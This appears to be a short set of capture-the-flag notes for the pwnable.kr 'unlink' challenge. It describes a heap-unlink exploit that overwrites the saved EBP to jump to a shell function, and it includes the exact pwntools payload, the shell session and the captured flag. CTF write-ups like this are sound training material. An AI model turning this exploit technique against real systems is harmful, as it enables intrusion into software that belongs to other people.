# shell function is at: 0x80484eb
# the return addr is on stack at : &A + 6*wordsize(4 byte)
# [....,A,C,B,ecx,ebp,[ecx-0x4], returnvaltolibc

# each OBJ is 16 bytes size, but when malloced sequently next to each other

# on pwnable.kr each malloc will do 24 bytes so 16 bytes for OBJ plus 8 bytes padding.
# What we want is to replace the saved EBP with a value on the malloc-ed area since we can control what is on the heap. We place the return address(shell invoking function) onto the heap since when the modified  ebp will be placed into esp then ret intruction will be replaced with the shell invoking function.

# 'here is stack address leak: 0xff99bfc4\nhere is heap address leak: 0x8c68410\nnow that you have leaks, get shell!\n'
# >>> p.sendline('\xeb\x84\x04\x08' * 4 + '\xd0\xbf\x99\xff' + '\x20\x84\xc6\x08')
# >>> p.interactive()
# [*] Switching to interactive mode
# cat /home/unlink/flag
# conditional_write_what_where_from_unl1nk_explo1t

#flag: conditional_write_what_where_from_unl1nk_explo1t
